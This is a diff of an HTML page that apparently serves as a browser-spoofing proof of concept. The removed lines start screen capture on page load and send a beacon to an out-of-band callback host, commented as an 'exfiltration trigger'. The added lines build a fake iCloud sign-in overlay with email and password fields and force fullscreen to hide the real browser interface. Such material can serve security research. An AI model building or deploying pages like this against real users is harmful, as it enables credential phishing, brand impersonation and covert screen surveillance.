@@ -1,54 +1,61 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Screen Access</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>iCloud Sign-In</title>
   <style>
     html, body {
       margin: 0;
-      background: #111;
-      color: white;
+      background: #f2f2f2;
       font-family: -apple-system, sans-serif;
+    }
+    #overlay {
+      position: fixed;
+      inset: 0;
+      background: white;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      flex-direction: column;
+      z-index: 9999;
     }
-
-    #status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #aaa;
+    input {
+      margin: 8px;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      width: 260px;
+      border-radius: 6px;
+    }
+    button {
+      margin-top: 12px;
+      padding: 12px 24px;
+      background: #007aff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
 
-<h2>Preparing screen sharing session…</h2>
-<p id="status">Waiting for permissions...</p>
+<div id="overlay">
+  <h2>Sign in to iCloud</h2>
+  <input type="email" placeholder="Email address" autocomplete="email">
+  <input type="password" placeholder="Password">
+  <button onclick="alert('Invalid password.')">Continue</button>
+</div>
 
 <script>
-  window.onload = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      video.autoplay = true;
-      video.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1000;";
-      document.body.appendChild(video);
-
-      document.getElementById("status").textContent = "✅ Screen stream started (no gesture).";
-
-      // Optional: exfiltration trigger
-      navigator.sendBeacon("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", "stream started");
-
-    } catch (err) {
-      document.getElementById("status").textContent = "❌ Access denied or blocked.";
-      console.error("Error:", err);
-    }
+  window.onload = () => {
+    setTimeout(() => {
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen().catch(e => {
+          console.log("Fullscreen blocked:", e);
+        });
+      }
+    }, 500);
   };
 </script>
 
